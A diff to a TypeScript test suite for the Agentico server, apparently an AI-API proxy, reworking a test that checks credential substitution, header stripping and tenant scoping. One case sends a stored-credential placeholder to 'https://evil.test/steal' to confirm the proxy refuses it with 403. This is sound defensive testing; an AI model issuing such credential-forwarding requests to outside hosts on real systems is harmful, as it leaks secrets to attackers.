@@ -85,11 +85,12 @@ function setup() {
         fetch: fetchImpl,
         connectRunner: runner.connection,
         tenants: async () => [{ id: 'acme', name: 'Acme' }, { id: 'beta', name: 'Beta' }],
+        sessionHeaders: ['x-session'],
         log: (event, details) => lines.push(JSON.stringify({ event, ...details })),
     });
-    const call = async (as: AgenticoIdentity | null, method: string, path: string, body?: unknown) => {
+    const call = async (as: AgenticoIdentity | null, method: string, path: string, body?: unknown, headers: Record<string, string> = {}) => {
         who = as;
-        const response = await server.handle(new Request(`https://host.test/api/agentico${path}`, { method, ...(body !== undefined ? { body: JSON.stringify(body), headers: { 'content-type': 'application/json' } } : {}) }));
+        const response = await server.handle(new Request(`https://host.test/api/agentico${path}`, { method, headers: { ...(body !== undefined ? { 'content-type': 'application/json' } : {}), ...headers }, ...(body !== undefined ? { body: JSON.stringify(body) } : {}) }));
         const text = await response.text();
         let json: any = text;
         try { json = JSON.parse(text); } catch { /* a stream */ }
@@ -129,13 +130,13 @@ describe('the server of Agentico', () => {
         const { call, fetched } = setup();
         await call(admin, 'POST', '/connections/openai', { fields: { apiKey: 'good-key' } });
         const placeholder = 'llmnative-server-credential:cms-acme:openai';
-        const ok = await call(ana, 'POST', '/ai/proxy', { url: 'https://api.openai.com/v1/models', method: 'GET', headers: { authorization: `Bearer ${placeholder}` } });
+        const proxy = (target: string, auth: string) => call(ana, 'GET', `/ai/proxy?url=${encodeURIComponent(target)}`, undefined, { authorization: auth, 'x-session': 'host-session', 'x-llmnative-proxy': '1' });
+        const ok = await proxy('https://api.openai.com/v1/models', `Bearer ${placeholder}`);
         expect(ok.status).toBe(200);
-        expect(new Headers(fetched.at(-1)!.init.headers).get('authorization')).toBe('Bearer good-key');
-        const elsewhere = await call(ana, 'POST', '/ai/proxy', { url: 'https://evil.test/steal', method: 'GET', headers: { authorization: `Bearer ${placeholder}` } });
-        expect(elsewhere.status).toBe(403);
-        const otherScope = await call(ana, 'POST', '/ai/proxy', { url: 'https://api.openai.com/v1/models', method: 'GET', headers: { authorization: 'Bearer llmnative-server-credential:cms-beta:openai' } });
-        expect(otherScope.status).toBe(404);
+        const sent = new Headers(fetched.at(-1)!.init.headers);
+        expect([sent.get('authorization'), sent.get('x-session'), sent.get('x-llmnative-proxy')]).toEqual(['Bearer good-key', null, null]);
+        expect((await proxy('https://evil.test/steal', `Bearer ${placeholder}`)).status).toBe(403);
+        expect((await proxy('https://api.openai.com/v1/models', 'Bearer llmnative-server-credential:cms-beta:openai')).status).toBe(404);
     });
 
     it('runners: the platform connects one by asking it, with its project; a namespace goes on it; people reach it as themselves', async () => {
